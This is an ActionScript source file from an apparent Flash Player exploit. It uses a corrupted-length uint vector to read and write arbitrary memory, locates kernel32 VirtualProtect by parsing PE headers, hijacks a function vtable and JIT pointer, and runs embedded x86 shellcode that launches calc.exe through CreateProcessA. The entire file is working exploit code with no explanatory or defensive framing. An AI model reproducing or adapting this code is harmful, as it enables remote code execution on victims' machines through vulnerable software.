package
{
	import flash.utils.ByteArray;
	
	class ShellWin32 extends MyClass
	{
		static var
			_v:Vector.<uint>,	// uint vector with corrupted length >= 0x40000000
			_vAddr:uint,		// _v[0] address
			_mc:MyClass2,
			_mcOffs:uint,		// index of mc.o1 within _v[]
			
			// x32 shellcode // searches and calls CreateProcessA("calc.exe",...) and returns eax as uint atom
			_x32:Vector.<uint> = Vector.<uint>([			
				0x83EC8B55, 0x5153ACC4, 0x058B6457, 0x00000030, 0x8B0C408B, 0x008B0C40, 0x588B008B, 0x03D88918,
				0x508B3C40, 0x8BDA0178, 0xDF01207A, 0x078BC931, 0x3881D801, 0x61657243, 0x78811C75, 0x4173730B,
				0x8B137500, 0xD8012442, 0x4804B70F, 0x011C528B, 0x821C03DA, 0xC78309EB, 0x4A3B4104, 0x8DCF7C18,
				0x8D50F045, 0x3157AC7D, 0x0011B9C0, 0xABF30000, 0x44AC45C7, 0x50000000, 0x50505050, 0x0009E850,
				0x61630000, 0x652E636C, 0x50006578, 0x595FD3FF, 0x03E0C15B, 0xC906C083, 0x909090C3
			]);
			 
		// converts uint to hex string
		static function Hex(u:uint):String
		{
			if (u <= 9 ) return u.toString() 
			else return "0x" + u.toString(16);
		}
		
		// init global vars
		static function Init(v:Vector.<uint>, vAddr:uint, mc:MyClass2, mcOffs:uint):Boolean
		{
			_v = v; _vAddr = vAddr; _mc = mc; _mcOffs = mcOffs;
			
			logAdd("v[0] address = " + Hex(_vAddr));
			return Get(vAddr - 8) == v.length;
		}			
		
		// restores corrupted memory
		static function CleanUp()
		{
			// restore _v.length
			Set(_vAddr - 0x8, 0x3f0);
		}
		
		// reads uint from the custom memory address
		static function Get(addr:uint):uint
		{
		 	if (addr < 0x10000) throw new Error("Get() at addr = " + Hex(addr)); // bad pointer
			return _v[(addr - _vAddr) >>> 2];
		}
		
		// writes uint into the custom memory address
		static function Set(addr:uint, val:uint)
		{
		 	if (addr < 0x10000) throw new Error("Set() to addr = " + Hex(addr)); // bad pointer
			_v[(addr - _vAddr) >>> 2] = val;
		}		
		
		// returns object's address 
		static function GetAddr(obj:Object):uint
		{
			_mc.o1 = obj;
			return _v[_mcOffs] - 1; // atom decrement
		}
		
		// searches for the kernel32.VirtualProtect() address
		static function FindVP():uint
		{ 
			try 
			{
				// find IMAGE_DOS_HEADER
				var u:uint, b:uint = _v[_mcOffs-3]; // b = vtable pointer inside dll/exe
				b = uint(b & 0xffff0000) - 0x400000 - _vAddr;
				for(var i:uint; i < 0x90; i++, b -= 0x10000){
					// check 'MZ'
					u = b >>> 2;
					if (uint(_v[u] & 0xffff) == 0x5a4d) break; 
				}
				if (i >= 0x90) throw new Error("can't find MZ from " + Hex(_v[_mcOffs-3]));
				
				// get IMAGE_NT_HEADERS
				u += 15;
				u = (b + _v[u]) >>> 2;
				// check 'PE'
				if (_v[u] != 0x4550) throw new Error("can't find PE");
				
				// get IMAGE_IMPORT_DIRECTORY
				u += 33;
				var size:uint = _v[u] >>> 2
				u = uint(b + _v[--u]) >>> 2; 
				
				// find kernel32.dll
				var v:Vector.<uint> = new Vector.<uint>(4);
				var oft:uint, ft:uint, j:uint, k:uint;
				u += 3;
				for(i=3; i < size; i += 5, u += 5){
					// read dll name into vector
					j = (b + _v[u]) >>> 2; 
					for(k=0; k < 4; k++, j++) v[k] = _v[j]; 
					
					// check dll name
					if (MyUtils.IsEqual(v, "KERNEL32.DLL")) {
						oft = _v[u-3]; ft = _v[u+1]; 
						break;
					}
				}
				
				if (oft == 0 || ft == 0) throw new Error("can't find kernel32");
				
				// find VirtualProtect() address
				u = uint(b + oft) >>> 2;
				v.length = 5;
		
				for(i=0; i < 256; i++, u++){
					// get proc name
					j = _v[u];
					if (j == 0) throw new Error("can't find VirtualProtect");
					j = (b + j) >>> 2; 
					for(k=0; k < 5; k++, j++) v[k] = _v[j]; 
					
					// check proc name
					if (MyUtils.IsEqual(v, "VIRTUALPROTECT", 2) && (MyUtils._bArr.readByte() == 0)) {
						j = uint(b + ft + i*4) >>> 2;
						return _v[j];
					}
				}
			} 
			catch (e:Error) 
			{
				logAdd("FindVP() " + e.toString());
			}
			
			return 0;
		}
		
		// declare dummy victim function
		static function Payload(...a){}
		
		// corrupts Payload function and calls VirtualProtect()
		static function CallVP(vp:uint, xAddr:uint, xLen:uint)
		{
			// generate Payload function object
			Payload();

			// find vtable pointer in Payload()
			var p:uint = GetAddr(Payload);
			var ptbl:uint = Get(Get(Get(Get(p + 8) + 0x14) + 4) + (_isDbg ? 0xbc:0xb0));
			// save old pointers
			var p1:uint = Get(ptbl);
			var p2:uint = Get(p+0x1c);
			var p3:uint = Get(p+0x20);
			
			// create copy of vtable
			for(var i:uint; i < 0x100; i++) _v[i] = Get(p1-0x80 + i*4);
			// redirect one pointer to VirtualProtect()
			_v[0x20+7] = vp; 
			
			// set first arg for VirtualProtect()
			Set(p+0x1c, xAddr);
			// set second arg
			Set(p+0x20, xLen);
			// set third arg = 0x40 PAGE_EXECUTE_READWRITE
			var args:Array = new Array(0x41);			
			
			// replace vtable pointer in Payload()
			Set(ptbl, _vAddr + 0x80);
			
			// call VirtualProtect()
			var res = Payload.call.apply(null, args);
			
			// restore old pointers
			Set(ptbl, p1);
			Set(p+0x1c, p2);
			Set(p+0x20, p3);
			
			// res should be nonzero (eax != 0)
			//if (("" + res) == "undefined") throw new Error("VirtualProtect() result = 0")
			//else logAdd("VirtualProtect() result = " + res);
		}
		
		//
		static function Exec()
		{										
			try 
			{						
				// get _x32[0] address
				var xAddr:uint = GetAddr(_x32);
				logAdd("x32[] object = " + Hex(xAddr));
				xAddr += _isDbg ? 0x1c : 0x18;
				if (Get(xAddr) < 0x10000) xAddr -= 4; // for FP 11.4
				xAddr = Get(xAddr) + 8;
				logAdd("x32[] data = " + Hex(xAddr));				
				
				// get kernel32.VirtualProtect() address
				var vpAddr:uint = FindVP();
				logAdd("VirtualProtect() address = " + Hex(vpAddr));
				if (vpAddr == 0) throw new Error("vpAddr == 0");
				
				// call VirtualProtect()
				CallVP(vpAddr, xAddr, _x32.length*4);		
				
				// find Payload JIT code pointer
				var payAddr:uint = GetAddr(Payload);
				logAdd("Payload() object = " + Hex(payAddr));
				payAddr = Get(Get(payAddr + 0x1c) + 8) + 4;
				var old:uint = Get(payAddr);

				// replace JIT pointer by &_x32[0]
				Set(payAddr, xAddr);		
				
				// call x32 payload
				var res = Payload.call(null);
				logAdd("CreateProcessA() returns " + res + (res == 0 ? " (in sandbox)":""));
					
				// restore old pointer
				Set(payAddr, old);
			}
			catch (e:Error) 
			{
				logAdd("Exec() " + e.toString());
			}
			
			CleanUp();
		}

	}

}